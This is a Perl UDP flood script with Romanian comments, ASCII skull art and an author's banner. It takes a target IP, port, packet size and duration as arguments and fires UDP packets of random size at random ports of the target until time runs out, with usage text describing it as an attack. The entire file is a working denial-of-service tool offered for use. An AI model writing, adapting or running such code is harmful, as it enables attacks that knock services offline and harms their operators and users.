#!/usr/bin/perl

#~~~~> SCRIPT 2k17 - 2k18 BOMBA FACUT DE zDarIus69 :3
#~~~~> Nu ma copia :3 Nu vei ajunge ca mine :3 
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 
#Created bY zDarIus69 
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Foloseste : perl zDarIus69.pl -> ip <- 80 65500 0\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD GREEN<<EOTEXT;
                         __________
                      .#########%%;.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
 X# \.X        @#%,.@                  @#%,.@        X./  #
  ##  X          @#%,.@              @#%,.@          X   #
, "# #X            @#%,.@          @#%,.@            X ##
   `###X             @#%,.@      @#%,.@             ####'
  . ' ###              @#%.,@  @#%,.@              ###`"
    . ";"                @#%.@#%,.@                ;"` ' .
      '                    @#%,.@                   ,.
      ` ,                @#%,.@  @@                `
                          @@@  @@@                  .
EOTEXT
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print "zDarIus69 tocmai arunca cu pietre in -> $ip <- " . ($port ? $port : "port") . " port cu " . 
  ($size ? "$size " : "65500") . "pachete pe secunda" . 
  ($time ? " for $time seconds" : "") . "
~ # Copia nu are valoare :3 #.
 # Private Archive zDarIus69 2k17 - 2k18 @ -> All rights reserved !  # " .
  ($time ? " for $time seconds" : "") . "\n";
print "Opreste Attack-ul folosind CTRL+C" unless $time;  
 
for (;time() <= $endtime;)
 {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}